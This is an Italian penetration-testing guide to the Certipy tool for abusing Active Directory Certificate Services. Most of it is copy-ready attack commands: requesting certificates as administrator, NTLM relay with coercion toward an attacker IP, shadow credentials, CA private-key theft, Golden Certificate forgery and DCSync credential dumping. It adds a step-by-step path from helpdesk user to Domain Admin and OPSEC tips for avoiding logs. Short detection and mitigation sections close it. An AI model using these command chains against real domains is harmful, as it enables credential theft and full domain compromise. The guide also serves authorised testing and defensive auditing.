---
title: 'Certipy: Guida Completa all''Enumerazione e Abuso di AD CS'
slug: certipy
description: >-
  Guida completa a Certipy per AD CS: find, req, auth, relay, forge, shadow.
  Enumerazione template vulnerabili (ESC1-ESC16), richiesta certificati,
  autenticazione e Golden Certificate. Comandi e scenari reali.
image: /certipy-ad-cs-exploitation.webp
draft: false
date: 2026-07-03T00:00:00.000Z
categories:
  - tools
subcategories:
  - expoit
tags:
  - certificate-services
  - ad-cs
---

# Certipy: Enumerazione e Abuso di AD CS in Active Directory

**In sintesi:** Certipy è uno strumento Python open-source sviluppato da Oliver Lyak per enumerare e sfruttare misconfigurazioni in AD CS. Copre l'intera catena — dalla scoperta dei template vulnerabili ([ESC1-ESC16](https://hackita.it/articoli/adcs-esc1-esc16/)) alla richiesta del certificato, all'autenticazione, fino alla forgiatura di Golden Certificates. È il tool di riferimento per qualsiasi engagement che tocca AD CS.

***

Certipy automatizza quello che in precedenza richiedeva una combinazione di `certutil`, Certify e script manuali. Un singolo comando `certipy find -vulnerable` identifica tutte le misconfigurazioni presenti nel dominio con la categoria ESC corrispondente. Da lì, ogni ESC ha il suo comando di exploit diretto.

> **Key Takeaway:** Certipy non richiede privilegi elevati per l'enumerazione — qualsiasi account di dominio è sufficiente. L'installazione è un `pip install certipy-ad`. Su Kali il comando è `certipy-ad` invece di `certipy`.

***

## Cheat Sheet — Comandi Principali

| Obiettivo                       | Comando                                                                                                                               |
| ------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------- |
| Enumera vulnerabilità (stdout)  | `certipy find -u user@corp.local -p Pass -dc-ip <DC> -vulnerable -stdout`                                                             |
| Enumera tutto su file           | `certipy find -u user@corp.local -p Pass -dc-ip <DC> -vulnerable`                                                                     |
| Enumera con hash                | `certipy find -u user@corp.local -hashes :NThash -dc-ip <DC> -vulnerable -stdout`                                                     |
| ESC1 — richiedi cert come admin | `certipy req -u user@corp.local -p Pass -dc-ip <DC> -ca 'CORP-CA' -template 'VulnTemplate' -upn 'administrator@corp.local'`           |
| ESC3 — agent cert               | `certipy req -u user@corp.local -p Pass -dc-ip <DC> -ca 'CORP-CA' -template 'EnrollmentAgent'`                                        |
| ESC3 — cert on-behalf-of        | `certipy req -u user@corp.local -p Pass -dc-ip <DC> -ca 'CORP-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx agent.pfx` |
| ESC4 — modifica template        | `certipy template -u user@corp.local -p Pass -template 'VulnTemplate' -save-old -dc-ip <DC>`                                          |
| Auth con certificato → NT hash  | `certipy auth -pfx administrator.pfx -dc-ip <DC>`                                                                                     |
| Auth con username esplicito     | `certipy auth -pfx administrator.pfx -dc-ip <DC> -username administrator -domain corp.local`                                          |
| Relay ESC8 HTTP                 | `certipy relay -ca CA01.corp.local -template DomainController`                                                                        |
| Relay ESC11 RPC                 | `certipy relay -target 'rpc://CA01.corp.local' -ca 'CORP-CA'`                                                                         |
| Shadow Credentials auto         | `certipy shadow auto -u attacker@corp.local -p Pass -account target -dc-ip <DC>`                                                      |
| Backup CA key (ESC7)            | `certipy ca -backup -ca 'CORP-CA' -u admin@corp.local -p Pass -dc-ip <DC>`                                                            |
| Golden Certificate              | `certipy forge -ca-pfx CORP-CA.pfx -upn 'administrator@corp.local'`                                                                   |
| Ripristino template ESC4        | `certipy template -u user@corp.local -p Pass -template 'VulnTemplate' -configuration old.json -dc-ip <DC>`                            |

***

```bash
# Via pip (preferibile — versione sempre aggiornata)
pip install certipy-ad

# Su Kali (già incluso nei repo)
sudo apt install certipy-ad

# Da GitHub (per la versione più recente)
git clone https://github.com/ly4k/Certipy
cd Certipy && pip install .

# Verifica versione
certipy -v
# oppure su Kali:
certipy-ad -v
```

> **Nota:** Su Kali il binario si chiama `certipy-ad`. In questa guida uso `certipy` — sostituisci con `certipy-ad` se sei su Kali.

***

## Sottocomandi Disponibili

```
find      — Enumera CA, template e configurazioni AD CS
req       — Richiede certificati
auth      — Autentica con un certificato → ottiene TGT e NT hash
relay     — NTLM relay verso endpoint HTTP/RPC del CA (ESC8/ESC11)
shadow    — Shadow Credentials abuse via msDS-KeyCredentialLink
forge     — Forgia Golden Certificates se hai la CA private key
template  — Gestisce e modifica template (ESC4)
ca        — Gestisce il CA e i certificati emessi (ESC7)
cert      — Gestisce file di certificato e private key
account   — Gestisce account utente e computer
ptt       — Inietta un TGT in memoria (Windows)
parse     — Enumera AD CS offline da dati di registro
```

***

## find — Enumerazione

```bash
# Base — output su stdout, mostra solo vulnerabili
certipy find -u utente@corp.local -p 'Password123!' \
  -dc-ip <DC_IP> -vulnerable -stdout

# Output su file (genera .txt e .json)
certipy find -u utente@corp.local -p 'Password123!' \
  -dc-ip <DC_IP> -vulnerable

# Con NT hash invece della password
certipy find -u utente@corp.local -hashes :NThash \
  -dc-ip <DC_IP> -vulnerable -stdout

# Se LDAPS non è disponibile sul DC
certipy find -u utente@corp.local -p 'Password123!' \
  -dc-ip <DC_IP> -vulnerable -scheme ldap

# Enumera tutto — anche template non vulnerabili
certipy find -u utente@corp.local -p 'Password123!' \
  -dc-ip <DC_IP> -stdout

# Specifica DC per hostname invece di IP
certipy find -u utente@corp.local -p 'Password123!' \
  -dc-ip <DC_IP> -vulnerable -stdout -target DC01.corp.local
```

L'output mostra per ogni template: nome, CA, EKU, chi può enrollarsi, e la categoria ESC identificata con una spiegazione del perché è vulnerabile.

***

## req — Richiedere Certificati

```bash
# ESC1 — richiedi cert come Administrator da template vulnerabile
certipy req -u utente@corp.local -p 'Password123!' \
  -dc-ip <DC_IP> -ca 'CORP-CA' \
  -template 'VulnerableTemplate' -upn 'administrator@corp.local'

# ESC1 — impersona un account specifico
certipy req -u utente@corp.local -p 'Password123!' \
  -dc-ip <DC_IP> -ca 'CORP-CA' \
  -template 'VulnerableTemplate' -upn 'svc_admin@corp.local'

# Con NT hash
certipy req -u utente@corp.local -hashes :NThash \
  -dc-ip <DC_IP> -ca 'CORP-CA' \
  -template 'VulnerableTemplate' -upn 'administrator@corp.local'

# Specifica CA per hostname (utile se il DC e il CA sono macchine diverse)
certipy req -u utente@corp.local -p 'Password123!' \
  -dc-ip <DC_IP> -ca 'CORP-CA' \
  -template 'VulnerableTemplate' -upn 'administrator@corp.local' \
  -target CA01.corp.local

# Output — per default genera administrator.pfx nella directory corrente
```

***

## auth — Autenticazione con Certificato

```bash
# Autentica con il PFX — ottieni TGT e NT hash
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>

# Specifica username e dominio (utile se il CN nel cert è ambiguo)
certipy auth -pfx administrator.pfx -dc-ip <DC_IP> \
  -username administrator -domain corp.local

# Output: TGT salvato come administrator.ccache + NT hash in stdout
# Usa il TGT
export KRB5CCNAME=administrator.ccache
impacket-secretsdump -k -no-pass corp.local/administrator@DC01.corp.local

# Oppure usa direttamente l'NT hash per Pass-the-Hash
impacket-secretsdump -hashes :NThash corp.local/administrator@<DC_IP>
```

***

## relay — NTLM Relay verso AD CS (ESC8/ESC11)

Coerci l'autenticazione di un DC o macchina target, relay verso il CA web enrollment, ottieni un certificato per quell'account.

```bash
# ESC8 — relay HTTP verso web enrollment
# Terminal 1: avvia il listener
certipy relay -ca CA01.corp.local -template DomainController

# Terminal 2: coerci l'autenticazione del DC
python3 PetitPotam.py -u utente -p 'Password123!' <ATTACKER_IP> <DC_IP>
# oppure
python3 Coercer.py coerce -l <ATTACKER_IP> -t <DC_IP> \
  -u utente -p 'Password123!' -d corp.local

# ESC11 — relay RPC (alternativa HTTP)
certipy relay -target 'rpc://CA01.corp.local' -ca 'CORP-CA'

# Una volta ottenuto il cert del DC machine account
certipy auth -pfx dc01.pfx -dc-ip <DC_IP>
# → NT hash del DC machine account → DCSync
```

***

## shadow — Shadow Credentials

Certipy gestisce nativamente Shadow Credentials — alternativa a pyWhisker con il vantaggio di fare tutto in un comando:

```bash
# Auto: aggiunge, autentica, ripristina
certipy shadow auto -u attacker@corp.local -p 'Password123!' \
  -account targetuser -dc-ip <DC_IP>

# Lista le key credential attuali
certipy shadow list -u attacker@corp.local -p 'Password123!' \
  -account targetuser -dc-ip <DC_IP>

# Aggiungi manualmente (senza auto-ripristino)
certipy shadow add -u attacker@corp.local -p 'Password123!' \
  -account targetuser -dc-ip <DC_IP>

# Rimuovi la key aggiunta
certipy shadow remove -u attacker@corp.local -p 'Password123!' \
  -account targetuser -device-id <GUID> -dc-ip <DC_IP>
```

Per la guida completa vedi [Shadow Credentials](https://hackita.it/articoli/shadow-credentials/).

***

## template — Modifica Template (ESC4)

```bash
# Salva la configurazione originale del template e abilita ESC1
certipy template -u attacker@corp.local -p 'Password123!' \
  -template 'VulnerableTemplate' -save-old -dc-ip <DC_IP>

# Sfrutta come ESC1
certipy req -u attacker@corp.local -p 'Password123!' \
  -dc-ip <DC_IP> -ca 'CORP-CA' \
  -template 'VulnerableTemplate' -upn 'administrator@corp.local'

# Ripristina il template originale (OPSEC — cleanup)
certipy template -u attacker@corp.local -p 'Password123!' \
  -template 'VulnerableTemplate' -configuration old_template.json -dc-ip <DC_IP>
```

***

## forge — Golden Certificates

Se hai accesso alla private key del CA (compromissione del CA server), puoi forgiare certificati per qualsiasi account senza lasciare log sul CA:

```bash
# Estrai la CA private key (richiede accesso al CA server)
certipy ca -backup -ca 'CORP-CA' -u administrator@corp.local \
  -p 'Password123!' -dc-ip <DC_IP>
# → genera CORP-CA.pfx

# Forgia un certificato come Administrator
certipy forge -ca-pfx 'CORP-CA.pfx' -upn 'administrator@corp.local' \
  -subject 'CN=Administrator,CN=Users,DC=corp,DC=local'

# Autentica con il cert forgiato
certipy auth -pfx administrator_forged.pfx -dc-ip <DC_IP>
```

I Golden Certificates forgiati non appaiono nei log del CA perché vengono creati offline — persistenza praticamente invisibile.

***

## ca — Gestione CA (ESC7)

```bash
# Lista i certificati emessi dal CA
certipy ca -ca 'CORP-CA' -list-templates \
  -u administrator@corp.local -p 'Password123!' -dc-ip <DC_IP>

# Backup del CA (estrae private key — richiede Manage CA)
certipy ca -backup -ca 'CORP-CA' \
  -u administrator@corp.local -p 'Password123!' -dc-ip <DC_IP>

# Approva una richiesta pending (ESC7)
certipy ca -ca 'CORP-CA' -issue-request <REQUEST_ID> \
  -u administrator@corp.local -p 'Password123!' -dc-ip <DC_IP>
```

***

## parse — Enumerazione Offline

Su Kali (certipy-ad) è disponibile il sottocomando `parse` per analizzare dati di registro AD CS raccolti offline, senza connessione al DC:

```bash
# Analizza dati di registro esportati
certipy-ad parse -target registry_data.json
```

***

## OPSEC

* `certipy find` genera query LDAP rilevabili — meno rumore di SharpHound ma non invisibile
* Le richieste certificato appaiono negli Event Log del CA (**Event ID 4886, 4887**) — il campo "Requester" mostra l'account autenticato, non l'account impersonato nel SAN
* `certipy template -save-old` + ripristino dopo l'exploit riduce il tempo di esposizione della misconfiguration su ESC4
* `certipy forge` non genera log sul CA — è l'approccio più stealth se hai già la CA private key
* Il PFX generato contiene credenziali — eliminalo dopo aver estratto l'NT hash

***

## Scenario Reale

Hai appena ottenuto un foothold con credenziali di un utente IT helpdesk. Prima mossa:

```bash
# 1. Enumera AD CS
certipy find -u helpdesk@corp.local -p 'Password123!' \
  -dc-ip <DC_IP> -vulnerable -stdout

# Output: template "HelpDeskCert" vulnerabile ESC1
# Enrollee: Authenticated Users ← chiunque può enrollarsi
# CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT: True ← puoi specificare qualsiasi SAN

# 2. Richiedi cert come Administrator
certipy req -u helpdesk@corp.local -p 'Password123!' \
  -dc-ip <DC_IP> -ca 'CORP-CA' \
  -template 'HelpDeskCert' -upn 'administrator@corp.local'

# 3. Ottieni NT hash
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
# [*] Got hash for 'administrator@corp.local': aad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c

# 4. DCSync con l'hash
impacket-secretsdump -hashes :8846f7eaee8fb117ad06bdd830b7586c \
  corp.local/administrator@<DC_IP>
```

Dall'utente helpdesk a Domain Admin in 3 comandi.

***

## Detection

**🔴 HIGH:**

* **Event ID 4886/4887** sul CA con SAN diverso dall'account richiedente
* **Event ID 4768** con pre-auth type 16 (PKINIT) per account che non usano normalmente certificati

**🟡 MEDIUM:**

* Burst di query LDAP verso il DC da un singolo IP (certipy find)
* Accesso al percorso `/certsrv/` dal web enrollment da IP inusuali
* Backup del CA (`certipy ca -backup`) da account non autorizzati

***

## Mitigazione

* Rimuovere `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` dai template non legacy
* Abilitare **Manager Approval** sui template sensibili
* Monitorare Event ID 4886/4887 per SAN anomali
* Proteggere la private key del CA con HSM o almeno con accesso strettamente limitato
* Audit periodico con `certipy find -vulnerable` — integra nei processi di vulnerability management

***

## FAQ

**Qual è la differenza tra `certipy` e `certipy-ad` su Kali?**
Stesso tool, nome diverso del binario. Su Kali il pacchetto si chiama `certipy-ad` per evitare conflitti con altri tool. I comandi sono identici.

**Certipy funziona su Windows?**
Sì, ma richiede Python. In contesti Windows è spesso più pratico usare [Certify](https://hackita.it/articoli/certify/) (C#, nessuna dipendenza Python) per la fase di enumerazione e richiesta, e Certipy da Linux per l'autenticazione.

**`certipy auth` fallisce con "KDC\_ERR\_PADATA\_TYPE\_NOSUPP" — cosa significa?**
Il DC non supporta PKINIT o non ha un certificato Kerberos Authentication installato. In questo caso AD CS è presente ma PKINIT non è configurato — Shadow Credentials e l'attacco via certificato non funzionano. Verifica la versione del DC e la configurazione PKINIT.

***

## Conclusione

Certipy ha trasformato l'abuso di AD CS da tecnica specialistica a procedura standard in qualsiasi engagement enterprise. L'automazione della catena find → req → auth riduce a pochi comandi quello che prima richiedeva ore di configurazione manuale.

La difesa richiede gli stessi strumenti: esegui `certipy find -vulnerable` sul tuo ambiente prima che lo faccia qualcun altro. Ogni misconfiguration ESC identificata è una via diretta verso Domain Admin che qualcuno prima o poi percorrerà.

***

**Risorse:**

* [Certipy GitHub](https://github.com/ly4k/Certipy)
* [Certipy Wiki — Command Reference](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
